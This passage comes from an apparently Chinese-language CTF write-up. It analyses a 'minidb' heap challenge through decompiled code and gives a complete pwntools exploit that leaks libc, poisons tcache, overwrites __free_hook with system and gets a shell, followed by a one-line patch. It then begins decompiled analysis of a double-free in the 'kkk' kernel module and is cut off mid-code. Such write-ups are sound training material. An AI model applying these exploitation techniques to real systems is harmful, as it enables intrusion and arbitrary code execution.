class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1A81</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-224h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+20h] [rbp-220h] BYREF</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-218h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">520</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-210h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+238h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a1 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the key: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v3);<br>    v4 = sub_168D(a1, v3, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the new value: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s);<br>      v2 = <span class="hljs-built_in">strlen</span>(s);<br>      *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>; <span class="hljs-comment">/* vulnerability here */</span><br>      <span class="hljs-keyword">if</span> ( (*a1 == <span class="hljs-number">1</span> || *a1 == <span class="hljs-number">2</span>) &amp;&amp; v2 &gt; <span class="hljs-number">127</span> || (*a1 == <span class="hljs-number">3</span> || *a1 == <span class="hljs-number">4</span>) &amp;&amp; v2 &gt; <span class="hljs-number">255</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span> *)(v4 + <span class="hljs-number">16</span>), s, v2);<br>        *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Succesfully update the value of specific key!&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于是签到题难度所以解法比较俗，简单风水一下利用越界写改一个数据库的 <code>database-&gt;name</code> 指向另一个 chunk，释放进 unsorted bin 利用 UAF read 泄露 libc 后重取释放回 tcache 后劫持 next 指针打 <code>__free_hook</code> 即可</p><blockquote><p>感觉也没啥好说的，毕竟本来就是签到题难度（</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p = process(&#x27;./minidb&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the new value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;666&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_db</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>:<span class="hljs-built_in">int</span>, name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the type of database: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_db_name</span>(<span class="hljs-params">orig_name:<span class="hljs-built_in">bytes</span>, new_name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(orig_name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the new name for database: &quot;</span>)<br>    p.sendline(new_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># pre heap fengshui </span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        add_kv(i, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    exit_db()<br><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br><br>    exit_db()<br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br>    add_kv(<span class="hljs-number">1919810</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    delete_kv(<span class="hljs-number">1919810</span>)<br><br>    exit_db()<br><br>    delete_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>)) <span class="hljs-comment"># reget 1919810</span><br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    update_kv(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">8</span>)) <span class="hljs-comment"># db-&gt;name is 114514 now</span><br><br>    <span class="hljs-comment"># fullfill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete_kv(<span class="hljs-number">1919810</span> + i)<br><br>    <span class="hljs-comment"># get an UAF unsorted chunk and leak libc</span><br>    delete_kv(<span class="hljs-number">114514</span>)<br>    exit_db()<br>    list_db()<br><br>    libc_leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    main_arena = libc_leak - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&quot;Get libc addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_leak))<br>    log.success(<span class="hljs-string">&quot;Libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># reget the victim</span><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br><br>    <span class="hljs-comment"># free the victim and leak heap base</span><br>    delete_kv(<span class="hljs-number">1919810</span> + <span class="hljs-number">6</span>)<br>    delete_kv(<span class="hljs-number">114514</span>)<br><br>    exit_db()<br>    list_db()<br>    p.recvuntil(<span class="hljs-string">b&#x27;\tarttnba3\n\t&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak - <span class="hljs-number">0x1640</span><br>    log.info(<span class="hljs-string">&quot;Get heap addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    log.success(<span class="hljs-string">&quot;Heap base: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    <span class="hljs-comment"># hijack the tcache list to __free_hook</span><br>    update_db_name(p64(heap_leak)[:<span class="hljs-number">6</span>], <br>                   p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x88</span>) \<br>                   + <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>))<br><br>    <span class="hljs-comment"># overwrite __free_hook by dbname</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>))<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) \<br>                 + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>    <span class="hljs-comment"># trigger</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br>    delete_db(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br><br></code></pre></td></tr></table></figure><p>运行即可 get shell</p><p><img src="https://s2.loli.net/2023/07/14/oxBjs2IzF83JucH.png" alt="image.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>直接把多余的漏洞指令给 nop 掉即可</p><p><img src="https://s2.loli.net/2023/07/07/SRjxs1QnDpKFowk.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/07/XiDM3odbWxmpTRe.png" alt="image.png"></p><h1 id="0x02-kkk（困难）"><a href="#0x02-kkk（困难）" class="headerlink" title="0x02. kkk（困难）"></a>0x02. kkk（困难）</h1><p>不知道为啥没人 <code>break</code> 的一道题目，漏洞本身利用的空间也挺大的，而且都有好几个队伍 <code>fix</code> 成功了，怎么最后解开的队伍数量还是 0 呢  :（</p><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目提供了一个 <code>kkk.ko</code>，惯例拖入 IDA，其 <code>ioctl()</code> 只提供了两个功能——读取 <code>k2u</code> 队列与写入 <code>u2k</code> 队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  mutex_lock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x1919810</span> )<br>  &#123;<br>    kkk_write_u2k_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x114514</span> )<br>  &#123;<br>    kkk_read_k2u_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(&amp;unk_143E);<br>  &#125;<br>  mutex_unlock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>写入 <code>u2k</code> 队列首先会判断队列是否已满，之后分配一个 object 并将数据从用户空间拷贝到内核空间，这里我们可以看出在队列当中的每个 object 都应当带有一个 <code>header</code> ，在 <code>header</code> 之后才是真正的用户数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_write_u2k_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// r13</span><br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// r15</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// r12</span><br>  __int64 v5; <span class="hljs-comment">// rbx</span><br>  __int64 v7[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-48h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+10h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+18h] [rbp-30h]</span><br><br>  v9 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  v8 = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  mutex_lock(&amp;u2k_lock);<br>  v1 = ((_WORD)u2k_tail + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>  <span class="hljs-keyword">if</span> ( u2k_head != v1 &amp;&amp; !copy_from_user(v7, a1, <span class="hljs-number">24LL</span>) &amp;&amp; v8 &lt;= <span class="hljs-number">0xFFFFFFFFFFFFFFE7</span>LL )<br>  &#123;<br>    v2 = _kmalloc(v8 + <span class="hljs-number">24</span>, <span class="hljs-number">4197568LL</span>);<br>    <span class="hljs-keyword">if</span> ( v2 )<br>    &#123;<br>      v3 = v2;<br>      v4 = v8 + <span class="hljs-number">24</span>;<br>      <span class="hljs-keyword">if</span> ( ((v8 + <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2, v8 + <span class="hljs-number">24</span>, <span class="hljs-number">0LL</span>);<br>      <span class="hljs-keyword">if</span> ( copy_from_user(v3, a1, v4) )<br>      &#123;<br>        kfree(v3);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v5 = u2k_tail;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)u2k_tail &gt;= <span class="hljs-number">0x1000</span> )<br>          _ubsan_handle_out_of_bounds(&amp;off_24B0, u2k_tail);<br>        u2k_queue[v5] = v3;<br>        u2k_tail = v1;<br>      &#125;<br>    &#125;<br>  &#125;<br>  mutex_unlock(&amp;u2k_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>读取 <code>k2u</code> 队列则是直接将队列中的 object 整个拷贝回用户空间，注意到这里存在一个漏洞：<strong>即使数据拷贝失败也会释放 object，但该 object 不会出队列，从而导致我们可以使得一个 object 被多次 free</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_read_k2u_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// rbx</span><br>  __int64 v2; <span class="hljs-comment">// rbx</span><br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  __int64 v4; <span class="hljs-comment">// r14</span><br>  __int16 v5; <span class="hljs-comment">// ax</span><br><br>  mutex_lock(&amp;k2u_lock);<br>  v1 = k2u_head;<br>  <span class="hljs-keyword">if</span> ( k2u_head != k2u_tail )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>      _ubsan_handle_out_of_bounds(&amp;off_24D0, k2u_head);<br>    v2 = k2u_queue[v1];<br>    <span class="hljs-keyword">if</span> ( !copy_to_user(a1, v2, <span class="hljs-number">24LL</span>) )<br>    &#123;<br>      v3 = *(_QWORD *)(v2 + <span class="hljs-number">16</span>);<br>      <span class="hljs-keyword">if</span> ( (v3 &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2 + <span class="hljs-number">24</span>, *(_QWORD *)(v2 + <span class="hljs-number">16</span>), <span class="hljs-number">1LL</span>);<br>      <span class="hljs-keyword">if</span> ( !copy_to_user(a1 + <span class="hljs-number">24</span>, v2 + <span class="hljs-number">24</span>, v3) )<br>      &#123;<br>        v4 = k2u_head;<br>        v5 = k2u_head;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>        &#123;<br>          _ubsan_handle_out_of_bounds(&amp;off_24F0, k2u_head);<br>          v5 = k2u_head;<br>        &#125;<br>        k2u_queue[v4] = <span class="hljs-number">0LL</span>;<br>        k2u_head = (v5 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>      &#125;<br>    &#125;<br>    kfree(v2);<br>  &#125;<br>  mutex_unlock(&amp;k2u_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>那么读取 <code>u2k</code> 队列与写入 <code>k2u</code> 队列的功能在哪完成呢？让我们将目光放回初始化函数，在完成设备文件注册后其会启动一个 CPU 核心数个内核线程（本题为 1 个），该线程会执行函数 <code>kkk_msg_handler_fn()</code>，这个函数比较长我们一步一步来分析</p><blockquote><p>本来想弄多个内核线程的，但是这样难度好像又太高了点（笑），所以只弄了一个</p></blockquote><p>该函数整体是一个大循环，开头有个小循环内部会循环轮询 <code>u2k</code> 队列，若不为空则从中取出一个 object，若 object 开头的字段不为 <code>1</code> 则释放掉并重新继续循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 